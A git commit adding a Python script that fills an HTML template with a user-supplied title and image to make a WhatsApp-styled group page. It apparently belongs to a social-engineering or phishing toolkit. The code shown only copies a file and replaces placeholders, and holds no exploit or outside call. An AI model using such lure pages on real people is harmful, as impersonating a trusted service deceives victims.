bba61e38616b81eb2d10963fe74876687f1eaf8a
Gerrishon <secretum.inc@pm.me>
2021-11-29 18:37:10 +0000

    iu

---
+++ template/mod_whatsapp.py
@@ -0,0 +1,31 @@
+#!/usr/bin/env python3
+
+import os
+import shutil
+import quo
+
+R = '\033[31m' # red
+G = '\033[32m' # green
+C = '\033[36m' # cyan
+W = '\033[0m'  # white
+
+
+quo.echo(f"[>>]", fg="vyellow", bold=True, nl=False, italic=True)
+quo.echo(" Group Title", fg="vcyan", nl=False)
+title = quo.prompt("")
+image = input(G + '[+]' + C + ' Path to Group Img (Best Size : 300x300): ' + W)
+
+img_name = image.split('/')[-1]
+try:
+    shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
+except Exception as e:
+    print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
+    exit()
+
+with open('template/whatsapp/index_temp.html', 'r') as index_temp:
+    code = index_temp.read()
+    code = code.replace('$TITLE$', title)
+    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))
+
+with open('template/whatsapp/index.html', 'w') as new_index:
+    new_index.write(code)
